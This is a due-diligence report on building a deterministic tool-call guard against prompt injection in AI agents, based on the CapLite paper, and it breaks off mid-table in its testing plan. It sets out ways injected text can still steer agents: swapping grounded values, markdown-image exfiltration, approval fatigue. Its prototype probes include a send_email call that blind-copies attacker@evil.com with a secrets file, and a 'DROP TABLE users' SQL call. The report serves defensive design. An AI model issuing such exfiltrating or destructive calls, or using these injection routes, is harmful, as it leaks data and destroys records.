# Write firewall for AI agents: product and technical due diligence

**Date:** 2026-11-14 · **Subject:** productising CapLite (arXiv:2611.17115) as a "write firewall" · **Status:** research only, nothing committed

## Verdict in brief

- **No-go on porting CapLite as the product, and no-go on a standalone venture-scale company built on it.** CapLite's guarantee is real, but its utility cost is much larger than the "21 points" headline on capable models, its rule ("the user must state the value") breaks on most real workflows, and its paper covers only open-weight models up to 35B on one benchmark.
- **Conditional go on a narrow, time-boxed build (5 weeks):** an open-source, in-process "argument provenance" guard for agent frameworks, run in shadow mode with 2–3 design partners that move money or share data. It has explicit kill criteria (section 6).
- **Why so cautious:** deterministic tool-call policy is already shipped by AWS, Microsoft, and at least six funded startups. The one thing I did not find in any shipping product is the paper's actual idea: a policy that needs no authoring because it checks *where an argument's value came from*. That gap is real but thin, and at least eight concurrent academic systems are working on the same idea, one of which (ROPE) reports far better utility and publishes code.

How to read the evidence labels in this document:

- **Verified (paper):** I read it in the paper's full text.
- **Vendor claim:** stated by the company that sells the product.
- **Secondary:** from a search-result summary of a third-party page. In this session I could not open most vendor sites directly (network policy), so nearly all competitor facts are secondary and should be re-checked before they go into any external document.
- **Guess / my analysis:** my own reasoning, not a sourced fact.

---

## 1. Paper deep-read

### 1.1 What the paper is

"CapLite: Prompt-Injection Defense for Small Language Model Agents without Model-Written Security Artifacts", Zimo Xu, Wenzhuo Liu, Hideki Nakayama (University of Tokyo; Institute of Automation, CAS). arXiv v1, 12 November 2026, 19 pages. It is a preprint; I found no venue or peer review.

The paper makes two separate contributions:

1. **A measurement:** four existing enforcement defenses (CaMeL, Progent, IPIGuard, DRIFT) all rely on something the agent's own model writes. On 15 open-weight models that artifact is unreliable.
2. **A design:** CapLite, where the model only proposes and deterministic code authorizes.

The pipeline has five model roles, all on one small model, plus a deterministic Mediator:

| Stage | Sees | Does |
|---|---|---|
| Planner | Only the request and tool schemas | Commits up to ten tool calls, with placeholders for values to look up. Writes cannot later be added, removed or reordered. |
| Reader | Request, committed writes, tool results | Up to ten read-only calls. Each read's destination (URL) is also checked. |
| Binder | Typed candidates extracted from tool results | Picks one candidate ID from an enum, or answers `none` / `ask`. It never writes a value. |
| Composer | Request and observations | Writes free-text payload (message bodies). Unconstrained. |
| Mediator (code) | The call and the grounding set | Admits a write only if the tool is classified, no placeholder remains, the schema matches, and every authority argument exactly equals a member of the grounding set. |
| Reporter | Observations | Writes the final answer. |

The grounding set is the e-mail addresses, IBANs, URLs, dates, quoted strings and numbers in the request, plus every token n-gram of the request up to length eight. Matching is exact after canonicalization (lower case, collapsed whitespace, URL scheme removed).

### 1.2 Claims checked against the full text

| Claim (from the brief) | Status | What the paper says |
|---|---|---|
| No successful attack in 13,935 attacked episodes | Verified (paper) | 15 models × 929 tool-goal pairs, `important_instructions` attack. Also 0/7,432 `tool_knowledge`, 0/168 read exfiltration, 0/104 descriptor collision, on eight models. |
| 18% of CaMeL's tokens | Verified (paper) | 17.1k vs 93.7k tokens per episode. The undefended agent uses 28.0k. |
| Utility under attack 29.0% vs CaMeL 27.2% | Verified (paper) | Averaged over 15 models. CaMeL is significantly better on Gemma-4-E4B (−12.2 points for CapLite) and Gemma-4-12B (−13.5). |
| 21 points below the undefended agent | Verified (paper), but understated | 29.0% vs 50.2% under attack. **Benign utility is 28.1% vs 59.4%, a 31-point gap.** |
| Authors release code | Stated, not found | The ethics statement says "We release code and per-episode outcome tables". The paper has no repository URL. Web search found no GitHub repository, and Hugging Face has no paper page, model or dataset named CapLite. Treat the code as **not yet available**. |

### 1.3 The number that matters most: utility on capable models

The averages hide the pattern. From the paper's per-model tables (benign utility, %):

| Model | Undefended | CapLite | Loss |
|---|---|---|---|
| Qwen3.5-9B | 93.8 | 27.8 | −66.0 |
| Qwen3.5-4B | 90.7 | 36.1 | −54.6 |
| Qwen3.6-35B-A3B | 90.7 | 42.3 | −48.4 |
| Gemma-4-12B | 81.4 | 41.2 | −40.2 |
| Granite-4.2-8B | 75.3 | 27.8 | −47.5 |
| Qwen3-32B | 66.0 | 36.1 | −29.9 |
| Qwen3-1.7B | 17.5 | 11.3 | −6.2 |

The better the model, the more CapLite costs. On the three models that complete over 90% of tasks undefended, CapLite completes 28–42%. A product that halves task completion will not be adopted, whatever its security guarantee. The best CapLite result on any model is 42.3%.

The paper's own failure analysis (1,046 failed benign episodes) says where the loss comes from:

| Cause | Share |
|---|---|
| Planner committed wrong or missing writes (354 of 448 committed no write at all) | 42.8% |
| All writes ran, or a read-only task was answered, but the task still failed | 38.4% |
| Tool error (malformed time, unknown ID) | 10.5% |
| Confirmation request on an authority or control value | 8.0% (11.8% counting every such request) |

Two things follow.

- **Most of the loss is the architecture, not the Mediator.** Committing writes before reading, with no loops or branches and a cap of ten calls, is what costs utility. The Mediator alone costs about 5.6 points of benign utility in the ablation.
- **The confirmation rate is a floor, not an estimate.** The evaluation never answers a confirmation and counts the episode as failed. 123 of 1,455 benign episodes (8.5%) hit a confirmation, on a benchmark whose tasks mostly spell out their values. Real requests are vaguer.

### 1.4 Is the security claim sound?

Yes, within its stated scope, and that scope is narrow.

- The guarantee is structural. The decision is a function of the request, the schema-derived policy and the proposed call. Tool output cannot change it. Optimised or adaptive injections against the model therefore do not matter, which answers the usual objection (Nasr et al., "The Attacker Moves Second", report that adaptive attacks broke all 12 defenses they tested; secondary).
- A trace audit re-derived the policy and grounding set offline and found no violation in 25,452 episodes.
- The ablations support the design: removing the Mediator admits 106 of 7,432 attacks, and letting the Planner add writes after reading admits 53.

Weaknesses in the evidence:

- **One benchmark, one run per configuration,** temperature 0. The paper lists this as a limitation.
- **No frontier or hosted model.** The largest is a 35B open-weight model.
- **Attacks are fixed templates** plus two the authors wrote against their own design. No independent red team has attacked the trusted code (schema rules, canonicalization, grounding set).
- **The policy audit used an LLM annotator, not a human gold label.** All 74 tools agree on read/write, but only 57 of 79 write-tool arguments agree.
- **The baselines are disadvantaged by design.** Every defense is run with a small model in every role. CaMeL's own paper reports 77% of tasks solved with provable security against 84% undefended, using large hosted models (secondary, from the abstract). The paper's "comparable to CaMeL" result is about small models only.

### 1.5 What CapLite does not protect

Each item below is either stated in the paper or follows directly from its definitions. I mark which.

**a. Free-text payloads (stated).** "The text of a free-text argument, such as a message body, is written by the Composer and is not constrained." An injection cannot change who receives an e-mail, but it can change what the e-mail says: a fraudulent bank account in an invoice reminder sent to the right customer, a phishing link posted to the right Slack channel. For any tool where the effect lives in the payload (SQL, shell, file contents, HTTP bodies), the guarantee covers nothing that matters.

**b. Dates, times and control flags (stated, and the most under-reported gap).** Arguments the schema marks as temporal, enum or boolean are not authority fields. The guarantee text says injected text can change "temporal values". The audit found 17 arguments that the annotator called authority but the rules derived as temporal or control, including "a share permission and a recurrence flag". The Binder does filter control fields against the grounding set, but the Mediator's guarantee does not list them (my reading). Concretely, an injection may be able to move a payment date, and the status of view-versus-edit sharing and one-off-versus-recurring payment rests on the Binder filter, not on the stated guarantee.

**c. Text returned to the user (stated).** The 20 answer-only injection pairs are excluded from the attack success rate, and the case study shows CapLite repeating the injected sentence. Misinformation and phishing through the final answer are out of scope.

**d. Confidentiality and exfiltration (partly covered).**
- Covered: a read tool with a URL argument is refused unless the request states the URL. This stopped 168 of 168 read-exfiltration attempts.
- Not covered: read tools without a destination argument are unrestricted, so the model sees everything the tools can reach.
- Not covered (my analysis): exfiltration through how the final answer is rendered, such as a markdown image whose URL carries data. This is the EchoLeak pattern (CVE-2025-32711, Microsoft 365 Copilot; secondary). CapLite mediates tool calls, not output rendering.
- Not covered (my analysis): query arguments of read tools. A web search whose query string contains private data leaks it to the search provider. Only destinations are checked on reads.

**e. Confused deputy: grounded value, wrong slot (my analysis, consistent with the paper).** Grounding is a set, not a binding. Any value the request states is admissible for any authority argument of any committed write. The paper concedes "a model failure can … pick a wrong candidate", and its replanning ablation shows attackers exploiting values the request states. Examples:
- "Pay 100 to Alice and 250 to Bob": an injection that steers the Binder can swap the amounts.
- "Forward the contract from Carol to Dave": Carol is a grounded recipient.
- Because every n-gram and number in the request is grounded, a number meant as an invoice ID can ground an amount.

**f. The request must be trusted, and often is not (my analysis).** The threat model trusts the request. That fails when:
- the user pastes an e-mail, document or ticket into the request, so attacker text enters the grounding set;
- the agent is triggered by an inbound ticket, webhook or schedule, so there is no human request;
- the requester is the adversary, as with a customer talking to a support agent.
Most enterprise agent deployments that buyers pay to secure fall into the second or third case.

**g. Values the user states ambiguously (stated).** "Send it to Bob" grounds the token `bob`, not `bob.smith@corp.com`. Exact matching means every name, nickname, "my landlord", "the usual amount" and "that file" becomes a confirmation. The paper rejected the obvious fix, matching a record by its descriptor, because an attacker can plant a record with the same name; that attack succeeded 23 times in 103 episodes.

**h. Authority values legitimately learned from tool output (stated).** "Reply to whoever e-mailed me", "pay this invoice", "book the cheapest hotel", "invite everyone on the thread". No grounded candidate exists, so CapLite asks. This is 8–12% of failures on AgentDojo, and the undefended agent completed 41 of those 84 episodes. AgentDyn, a benchmark built around dynamic tasks, reports that CaMeL's static planning scored zero utility there (secondary). CapLite shares the static-plan design, so I expect it to do badly there too (guess; untested).

**i. Multi-turn conversations (not addressed).** The paper defines one request per episode. It does not say how the grounding set grows across turns, whether a value the assistant displayed and the user approved counts, or how persistent memory is treated. A grounding set that accumulates over a long conversation gets weaker with every turn (my analysis).

**j. Loops and branching (stated).** "A plan without code also cannot loop or branch on observed data." Tasks like "for each unpaid invoice, send a reminder" are out of reach.

**k. Unfamiliar tools (stated).** Classification uses English verb lists on the tool name and docstring. Unclassified tools are denied. Generic tools such as `execute_sql`, `run_command`, `http_request` or `browser_click` either get denied or get classified by a name that says nothing about their effect.

**l. Malicious or changed tool definitions (stated as trusted).** Tool descriptions are trusted. Tool poisoning and "rug pull" changes to an MCP server are out of scope.

**m. The human confirmation itself (my analysis).** Confirmed values join the trusted set. Anthropic reports that users accept 93% of permission prompts (verified from Anthropic's engineering post). A defense that converts attacks into confirmation dialogs inherits approval fatigue, and the text shown in the dialog can itself be attacker-influenced.

### 1.6 Comparison with related defenses

| System | Who writes the security artifact | What is enforced | Reported result | Code |
|---|---|---|---|---|
| CaMeL (Debenedetti et al., 2025) | The model writes a program; authors write per-suite policies | Capabilities and data-flow in a custom interpreter | 77% utility vs 84% undefended on AgentDojo with large models (secondary). 20 breaches in 13,935 with small models; programs fail to run in up to 68% of episodes (CapLite paper) | Public (google-research/camel-prompt-injection) |
| FIDES (Costa et al., Microsoft, 2025) | Planner with confidentiality and integrity labels | Information-flow control with taint tracking; adds primitives to hide information | Evaluated on AgentDojo (arXiv abstract) | Not checked |
| Progent (Shi et al., 2025) | Model writes and updates a privilege policy in a DSL | Deterministic check of each call against the policy | 676 breaches on 14 of 15 small models (CapLite paper) | Public (sunblaze-ucb/progent) |
| IPIGuard (An et al., 2025) | Model plans a tool dependency graph | Executes only the graph | 435 breaches on 13 of 15 small models (CapLite paper) | Public |
| DRIFT (Li et al., 2025) | Model writes trajectory and parameter checklist | Validator plus injection isolator | 214 breaches on 11 of 15 small models (CapLite paper) | Public |
| **CapLite** | Nobody: fixed rules over schemas | Committed writes; authority arguments must equal request-stated values | 0 of 13,935; benign utility 28.1% vs 59.4% | Promised, not found |
| ROPE (Ma et al., arXiv:2608.27496) | Offline-audited list of sensitive parameters | Origin check: value must trace to the user, a source the user named, or the user's own records | ASR 1.6–2.6% while keeping 82–100% of undefended utility, four models (arXiv abstract) | Public (github.com/xhOwenMa/ROPE, per abstract) |
| PACT (Fan et al., arXiv:2605.11039) | Semantic roles per argument, model-assisted | Per-argument provenance contracts | 100% security on three strongest models, 38.1–46.4% utility, 8–16 points above CaMeL (arXiv abstract) | Not checked |
| ToolFence (Li et al., arXiv:2609.37196) | Model compiles a typed authorization blueprint | Deterministic monitor plus judge for capability grants | Near-zero ASR with a 3.8-point utility drop on AgentDojo with Qwen3-max (arXiv abstract) | Not checked |

What this table says for a product decision:

- **CapLite is one of at least eight 2026 systems built on the same idea** (authority arguments must originate from a trusted source). The paper itself cites PACT, ROPE, ToolFence, TraceGrant, IntentCap, MetaPermit, SARA and CXI as concurrent work.
- **CapLite sits at the strict end.** It trades the most utility for a zero-ASR result and independence from model quality. ROPE and ToolFence report nearly undefended utility with a small residual attack rate, by widening what counts as a trusted origin.
- **For a product on hosted frontier models, ROPE's trust rule is the better starting point** ("the user, a source the user explicitly named, or the user's own authoritative records"). It directly addresses gaps g and h. Its numbers are self-reported and I have not run its code.
- CapLite's distinctive strength, working with models too small to write a policy, matters for on-device and local agents. That is a much smaller market today (guess).

---

## 2. Product shape

### 2.1 The constraint that decides the shape

**An MCP proxy cannot enforce the CapLite rule on its own.** A proxy sees tool calls and results. It does not see the user's request or which values the user stated. The check "does this argument equal something the user said?" needs the request, and "did this value come from tool output?" needs the conversation. Both live in the agent harness.

This cuts two ways. It is why existing gateways ship static rules (allow, deny, limits, approval) and not provenance rules. It also means the product must be in-process, or the proxy must be told the request through a side channel that the model cannot write to.

### 2.2 Options compared

| Option | For | Against | Verdict |
|---|---|---|---|
| OSS SDK / middleware in the agent harness | Sees the request and every tool result. Fits the hooks every framework already has. Low adoption friction. | No revenue by itself. Each framework needs an adapter. | **v1** |
| MCP proxy / gateway | One URL change, no code. Central control. | Cannot see the request (2.1). Crowded: at least ten gateways exist (section 4). | v1.5 as an optional mode, fed by the SDK |
| Hosted policy, approval and audit service | The part buyers pay for: approvals routed to the right human, tamper-evident audit, policy management | Needs trust and compliance work (SOC 2). Competes with Auth0 async authorization, PolicyLayer, Arcjet. | v2, only if design partners ask for it |
| Feature sold to agent platforms | Platforms own the harness, so integration is natural | Platforms can build it: the core check is a few hundred lines. Long sales cycle. | Likely exit path, not a starting point |

### 2.3 Proposed v1: an "argument provenance guard"

It is not a CapLite port. It keeps CapLite's Mediator and schema-derived policy, drops the Planner/Reader/Binder pipeline that causes most of the utility loss, and widens the trusted origins along ROPE's lines.

```
 user turn(s) ──► [Trust root capture] ──► grounding set G
 operator config ─► trusted records (payee list, own domains, address book) ─┐
                                                                             ▼
 agent loop ─► tool call ─► [Guard: classify tool → typed canonicalize args → origin check]
                                      │            │             │
                                    ALLOW        CONFIRM        DENY
                                      │            │             │
                                 tool runs   out-of-band     error returned
                                             approval        to the model
                                      └────────────┴─────────────┘
                                                   ▼
                                   append-only, hash-chained audit log
```

**Where it sits and how it intercepts.** In-process, on the "before tool call" hook each framework exposes:

| Runtime | Hook | Source |
|---|---|---|
| Claude Agent SDK / Claude Code | `PreToolUse` hook. It runs before every other permission step and a hook denial applies even in bypass mode. | Anthropic docs (secondary) |
| OpenAI Agents SDK | `needs_approval` as a per-call function that receives parsed arguments; `require_approval` for MCP servers; tool guardrails | OpenAI docs (secondary) |
| Google ADK | `before_tool_callback`, tool confirmation | Secondary |
| LangGraph / LangChain | Tool-node wrapper or middleware plus `interrupt` for approval | General knowledge; not re-verified this session |
| Raw MCP | Optional proxy mode. The SDK passes a signed session context (grounding set hash, session ID) that the proxy uses. | Design proposal |

**How authority arguments are identified.** Three layers, strictest first:

1. **Default-authority rule from the schema (CapLite's rule).** Every argument of a write tool is authority unless it is clearly payload, temporal or control. Unknown tools are denied. This default matters: the existing toy prototype does the opposite (see 2.5).
2. **MCP annotations as hints only.** `readOnlyHint` and `destructiveHint` exist, but the specification says clients must treat annotations as untrusted unless the server is trusted (secondary). Use them to tighten, never to loosen.
3. **A reviewed overlay file** checked into the customer's repository, pinned to a hash of each tool schema. A schema change invalidates the pin and fails closed. This also catches rug-pull changes. Unlike CapLite, treat temporal and control arguments on money and sharing tools as authority.

**Typed canonicalizers** per argument type: e-mail address, domain, IBAN and account number, amount with currency, URL (host and path separately), phone number, file path, opaque ID. Type-aware matching closes the "invoice number grounds an amount" hole.

**Trusted origins** (the main departure from CapLite):

- values the user typed in an authenticated turn, bound to a type;
- values confirmed out of band;
- operator-declared trusted records: vendor master file, the organisation's own domains, the user's address book, objects the authenticated user owns;
- optionally, a "named source" rule: the user points at a specific record ("reply to this thread") and the reply address of that record becomes admissible.

Everything else gets CONFIRM for reversible actions and DENY for irreversible ones, configurable per tool.

**Write commitment** as an opt-in strict mode. Before the first untrusted read, the harness asks the model which write tools the task needs and freezes that list. The paper's ablation shows this closes a residual 0.7% of attacks. It is cheap (one small call) and avoids CapLite's full fixed plan.

**Confirmation UX.**
- Show the tool, the argument that failed, the value, and where the value came from (which tool result, with a short quote).
- Render attacker-reachable text as plain text, never markdown or HTML.
- Deliver approvals out of band (Slack, e-mail, push) so the agent cannot forge one. A reported Google ADK vulnerability let attackers forge tool confirmations (secondary, unverified), which shows the risk.
- Batch approvals per task.
- "Always trust this payee" writes to the trusted records, and should itself require a second approver for money tools.
- Offer integration with existing approval rails such as Auth0 asynchronous authorization (CIBA) in place of a home-grown one.

**Audit log.** One append-only, hash-chained record per decision: request hash, policy version, tool, canonical arguments, origin of each authority value, verdict, approver. Ship an offline verifier that re-derives every decision from the log, as the paper's trace audit does. That verifier is the artifact a compliance buyer wants.

### 2.4 What v1 deliberately does not do

- No prompt-injection detection or classifier.
- No protection of payload text, final-answer text or read-side confidentiality. Say so in the README and recommend pairing with output rendering controls and egress limits.
- No browser or shell coverage.

### 2.5 State of the existing prototype

`/home/user/paper-scout/prototypes/2026-11-14-write-guard/` is a fair illustration but is not a base for the product. I ran four probes against it (read-only, no files changed):

| Probe | Result | Why |
|---|---|---|
| `send_email(to=<stated>, bcc=attacker@evil.com, attachments=[secrets.txt])` | ALLOW | Authority arguments are an allowlist of name hints. `bcc`, `cc` and `attachments` are not on it. CapLite uses the opposite default. |
| `execute_sql(query="DROP TABLE users")` | ALLOW as "read-only tool" | Any tool whose first word is not a known write verb is treated as a read. CapLite denies unclassified tools. |
| `send_money(recipient="bob", amount=7, recurring=True)` when the request says "pay bob 100 to account 7" | ALLOW | Untyped grounding: the account number grounds the amount. `recurring` is unchecked. |
| `send_money(recipient="alice@corp.com", amount="3")` when the request mentions "Q3 report" | ALLOW | Number extraction turns "Q3" into 3. |

The README already admits that matching is untyped. The first two are fail-open defaults and need to be reversed before anyone else sees the code.

---

## 3. Scenarios beyond payments

Scores are my judgment (1–5). "Fit" is how well the rule "authority values must be user-stated" works, first as CapLite defines it and then with the trusted-records extension from 2.3. Willingness to pay is inferred from the existence of budgets and of funded vendors in the category; I have no price data and found none.

| Rank | Scenario | Pain | WTP | Strict rule | With trusted records | Score (pain × WTP, adjusted for fit) |
|---|---|---|---|---|---|---|
| 1 | Money movement: accounts payable, payouts, treasury agents | 5 | 5 | Breaks for the main workflow. Payee and amount come from the invoice, which is untrusted. Fits only direct instructions. | **Strong.** "Bank details must equal the vendor master; amount must equal the approved purchase order" is the classic control against invoice fraud. | 25, good fit |
| 2 | Outbound sharing: file sharing, external e-mail, Slack-out (DLP angle) | 4 | 4 | Fits. "Share with a recipient I named, or inside my domain." | **Strong.** Add own-domain and address-book rules. | 16, good fit |
| 3 | IT and helpdesk agents: password resets, access grants | 5 | 4 | Breaks. The requester may be the attacker, and the ticket is untrusted text. | **Moderate.** Recast as "the target account must equal the authenticated requester, or be approved by its manager". That is identity binding more than provenance. | 20, partial fit |
| 4 | Customer-support agents issuing refunds and credits | 5 | 4 | Breaks. The "user" is the customer. | **Moderate.** "Order must belong to the authenticated customer; refund at most the order value." This is ordinary authorization plus business rules, which PolicyLayer, Arcjet and Cedar-based tools already express. | 20, weak differentiation |
| 5 | E-mail and calendar assistants | 4 | 3 | Fits explicit sends. Breaks on reply, forward and "invite the people on this thread", which are the common cases. | Moderate, with the named-source rule and own-domain rule. | 12, partial fit |
| 6 | Procurement agents | 4 | 4 | Breaks. Supplier, price and quantity come from quotes. | Moderate, but procurement suites already have approval chains, and sales cycles are long. | 16, poor timing |
| 7 | CRM updates | 3 | 3 | Breaks often. Users say "the Acme deal", never the record ID. This is exactly the descriptor case the paper found attackable. | Moderate: "record must be owned by the user". | 9 |
| 8 | Coding agents: git push, deploy, secrets | 5 | 4 | Breaks. The effect is in the payload (shell command, file contents). Only a few arguments are checkable: remote, branch, deploy target, secret destination. | Weak. Sandboxes and vendor-native classifiers own this. Anthropic's auto mode is now the default for several plans (secondary). | 20 pain, poor fit |
| 9 | Browser agents | 5 | 3 | Breaks. Actions are clicks and keystrokes with no schema-level authority. Grounding URLs would stop browsing. | Weak. | 15 pain, poor fit |

**Top three for this product:** money movement with vendor-master grounding, outbound sharing and sending, and identity-bound privileged actions in helpdesk and support.

Observations:

- The strict CapLite rule fits cleanly in only one scenario (outbound sharing with a named recipient). Everywhere else the product is really "authority values must come from a trusted record", which is a broader and more useful rule, and closer to ROPE than to CapLite.
- The highest-pain scenarios for injection today, coding and browser agents, are the ones where argument-level checks help least.
- For payments in consumer commerce, the card networks and Google are building the same guarantee into the rails. AP2 uses signed "intent" and "cart" mandates that record what the user authorised; Visa and Mastercard have their own schemes (secondary). That closes the consumer-checkout corner of scenario 1. Business payouts and accounts payable remain open.

---

## 4. Competition

### 4.1 Summary

The initial scout report said most competitors do "detection or red-teaming, not deterministic write authorization". **That is wrong for the gateway and authorization segment.** Deterministic, argument-level policy on tool calls, with approval and audit, is shipping from two hyperscalers and many startups. What I did not find is provenance-based policy: rules about where an argument's value came from, derived without anyone writing policy.

"Not found" here means not found in a few hours of search with most vendor sites unreachable from this session. It is not proof of absence.

### 4.2 Deterministic or policy-based tool-call authorization

| Player | What it does | Deterministic argument-level rules? | Approval step? | Provenance of values? | Evidence |
|---|---|---|---|---|---|
| **AWS: Policy in Amazon Bedrock AgentCore** | Cedar policies evaluated at the AgentCore gateway, outside agent code. Policies can be drafted from natural language. GA 3 March 2026. Bedrock Guardrails integration added June 2026. | Yes (Cedar) | Not found | Not found | AWS announcement (secondary) |
| **Microsoft Agent Governance Toolkit** | MIT-licensed open source, released April 2026. Stateless allow/deny engine at the middleware layer; YAML, OPA Rego and Cedar; fails closed. Microsoft reports under 0.1 ms p99. | Yes | Not found | Not found | Microsoft open-source blog (secondary; latency is a vendor claim) |
| **PolicyLayer** | Hosted MCP gateway. Rules can allow, deny, rate-limit or require approval; examples include refund limits and blocking `DELETE` without `WHERE`. | Yes (vendor claim) | Yes (vendor claim) | Not found | Vendor pages (secondary). Pricing not retrieved; the site is not reachable from this session. |
| **Arcjet agent guards** | In-code guards that wrap tools in LangChain, LangGraph, Vercel AI SDK, Mastra, CrewAI, Google ADK, OpenAI Agents and Claude Managed Agents. Rego policies run before the call and can block or require human approval. | Yes | Yes | Not found. Docs advise taking actor identity from authenticated state, not model arguments. | Vendor docs and press (secondary) |
| **Permit.io MCP Gateway** | Launched 27 March 2026. Authorization, delegation tracking and audit on MCP calls via a URL change. Rego and Cedar. | Yes | Not found | Not found | Trade press (secondary) |
| **Cerbos** | Apache-2.0 policy decision point with published MCP authorization guidance; commercial Cerbos Hub. | Yes (general-purpose) | No | No | Vendor blog titles (secondary) |
| **Oso** | Authorization engine (Polar) with agent-authorization guidance. A Permit.io blog claims Oso Cloud was acquired by Tiny in October 2026. | Yes (general-purpose) | No | No | Secondary; **the acquisition claim is unverified and comes from a competitor** |
| **Descope, Auth0 (Okta), Keycard** | Agent identity. Auth0 for AI Agents went GA November 2025 with Token Vault, asynchronous authorization (CIBA approval by push) and FGA for RAG. Keycard raised $38M for task-scoped, short-lived agent tokens. | Scope-level, not argument-level | Auth0: yes | No | Auth0 blog, trade press (secondary) |
| **Invariant Labs (acquired by Snyk, June 2025)** | Guardrails: a rule engine for contextual rules including data-flow restrictions. Gateway: an MCP and LLM proxy. Both reported as still open source under Apache-2.0. | Yes | Not found | **Closest match.** Data-flow rules over the trace. | Snyk announcement, trade press (secondary) |
| **Solo.io agentgateway** | Open-source gateway with CEL policies. Sources conflict on whether tool arguments are readable in MCP authorization rules. | Partly | No | No | Project docs vs a competitor's page (secondary, conflicting) |
| **Docker MCP Gateway** | Open-source gateway with interceptor hooks, call logging and secret blocking. | Via custom interceptors | No | No | Docker blog (secondary) |
| **Cloudflare MCP server portals** | Access policies decide which MCP servers a user sees; Gateway can detect MCP traffic that bypasses portals. | Server-level | No | No | Cloudflare docs (secondary) |
| **Runlayer** | MCP gateway, threat detection, observability, governance. $11M seed (Nov 2025) and $30M Series A (June 2026). | Not established | Not established | Not found | Trade press (secondary) |
| **Zenity** | Inline runtime prevention for Copilot Studio and Microsoft Foundry agents, GA 17 March 2026. "Tool misuse" prevention was marked coming soon at launch. A page title mentions a $125M raise. | Vendor says it can enforce which tools run, under what conditions, with what data | Not found | Not found | Vendor press release (secondary; marketing-heavy, engine internals not described) |
| **Lasso Security** | MCP gateway (open source, MIT) inspecting MCP traffic; paid platform adds inline enforcement and DLP. Mostly content inspection. | Limited | No | No | Competitor comparison pages (secondary, not neutral) |
| **Operant AI, Pillar Security** | Runtime protection and posture management across the AI lifecycle. | Not established | Not established | Not found | Roundup articles (secondary, thin) |

### 4.3 What model vendors ship natively

| Vendor | Native control | Relevance |
|---|---|---|
| **Anthropic** | Permission modes, allow/deny rules, `PreToolUse` hooks and a `canUseTool` callback in the Agent SDK. Claude Code auto mode: a classifier that sees the transcript with tool results stripped, plus a separate probe that scans tool outputs. Reported false-positive rate 0.4% and miss rate 17% on overeager actions (n=52) for the full pipeline. | The hook is the integration point for our guard. Auto mode is probabilistic, so a deterministic guard complements it. Stripping tool results from the classifier's view is the same principle as CapLite's Planner. Figures verified from Anthropic's engineering post. |
| **OpenAI** | Agents SDK: `needs_approval` as a constant or per-call function, `require_approval` for MCP servers, input/output/tool guardrails. Agent Builder guidance recommends enabling approval for MCP tools. | A provenance check can be written as a `needs_approval` function today. I found no built-in provenance rule. (Secondary) |
| **Google** | ADK callbacks and tool confirmation; Model Armor content scanning; Google's MCP guidance recommends layered controls and notes that human approval is vulnerable to over-trusting users. CaMeL came from Google and DeepMind researchers. | Same hook pattern. I found no evidence that CaMeL ships in a Google product (unverified either way). |
| **Payments rails** | Google AP2 mandates, Visa Trusted Agent Protocol, Mastercard Agent Pay. | Protocol-level "the user authorised this cart" for consumer payments. (Secondary) |

### 4.4 Detection and red-teaming (the M&A cluster in the scout report)

| Deal | Check |
|---|---|
| Check Point – Lakera | Announced mid-September 2025. About $300M is widely reported but **was not officially disclosed** (secondary). The scout report's "$300M" should say "reported, about". |
| CrowdStrike – Pangea ($260M), SentinelOne – Prompt Security, Proofpoint – Acuvity, OpenAI – Promptfoo | Not re-verified this session. Carried over from the scout report as listed there. |
| Snyk – Invariant Labs | Confirmed, announced 24 June 2025 (secondary). Missing from the scout report and more relevant than the others, because Invariant built deterministic guardrails. |

These acquisitions show that large security vendors buy AI-security startups. They do not show demand for this specific control: most targets were detection, data-loss or red-teaming products.

### 4.5 Where the gap is

| Capability | Shipped by others? |
|---|---|
| Allow/deny a tool by name or agent identity | Yes, widely |
| Static rules on argument values (limits, allowlists, regex) | Yes: AWS, Microsoft, PolicyLayer, Arcjet, Permit.io, Cerbos |
| Human approval on selected calls | Yes: PolicyLayer, Arcjet, Auth0, OpenAI, Anthropic, Google |
| Audit log of tool calls | Yes, widely |
| **Policy derived from schemas with no authoring** | Not found |
| **Rule on the origin of a value (user-stated, trusted record, or untrusted tool output)** | Not found as a product. Invariant's data-flow rules are nearest. Eight or more research systems. |
| **Offline verifier that re-derives every decision** | Not found |

The gap is a feature set, not a category. Any of the vendors above that already sits in the harness (Arcjet, Microsoft, the model vendors' own SDKs) could add an origin check in weeks once customers ask.

---

## 5. Testing and evaluation plan

The goal is to answer three questions with numbers: does it stop attacks, how much work does it break, and how often does it interrupt a human.

### 5.1 Metrics

| Metric | Definition | Target for a go decision (my proposal) |
|---|---|---|
| Attack success rate (ASR) | Share of attacked episodes where the attacker's write happens | 0 for covered argument types, by construction; report a confidence bound, not just zero |
| Benign utility (BU) and utility under attack (UA) | Task success without and with injection | Within 5 points of the undefended agent on a frontier model, counting answered confirmations |
| Confirmation rate | Confirmations per task and per write call | Under 10% of write calls in the wedge workflow |
| False-confirmation rate | Confirmations where the value was what the user intended | Reported per scenario; this is the "annoyance" number |
| Approved-attack rate | Share of malicious confirmations a human approves | Measured in a user study; no target yet |
| Latency overhead | Added time per tool call, p50 and p99 | Under 5 ms p99 in-process (no model call in the path) |
| Token overhead | Extra tokens per episode | Near zero in default mode; one small call in strict mode |

Two reporting rules:

- Always report utility three ways: confirmations unanswered (the paper's method), answered by a simulated user from ground truth, and answered by a simulated user who approves everything. The gap between the last two is the cost of approval fatigue.
- Report results per model, including at least two hosted frontier models. Averages hid the main problem in the paper.

### 5.2 Public benchmarks

| Benchmark | Why | Notes |
|---|---|---|
| AgentDojo v1.2.2 | The common yardstick: 97 user tasks, 949 task–injection pairs, four suites. Lets us compare with the paper's numbers. | Run undefended, CaMeL, Progent and ROPE alongside (all have public code). Add CapLite when its code appears. |
| AgentDyn | 60 open-ended tasks, 560 injections, dynamic planning, and benign third-party instructions. Tests exactly where static plans fail. | The most likely place to see our utility collapse. Run it early. |
| InjecAgent | 1,054 cases, 17 user tools, 62 attacker tools. Cheap, single-turn. | Good for regression, weak on utility. |
| Agent Security Bench (ASB) | Broad attack and defense matrix: 16 attack types, 10 scenarios, 400+ tools (secondary). | Tests schema classification across many unfamiliar tools. |
| MCP-SafetyBench | MCP-specific attacks across server, host and user sides (secondary). | Covers tool poisoning, which is outside our guarantee; use it to document the boundary. |
| WASP | Web-agent injection in realistic end-to-end settings. | Expected to be out of scope. Run once to state the limit honestly. |

Benchmark details in this table other than AgentDojo come from search summaries and should be confirmed from the benchmark papers before use.

### 5.3 Our own scenario suite

Public benchmarks over-represent tasks that spell out their values. Build about 50 tasks per wedge scenario, each labelled with where its authority values come from:

| Class | Example | Expected behaviour |
|---|---|---|
| A. Stated explicitly | "Pay 1,250 EUR to DE89…" | ALLOW |
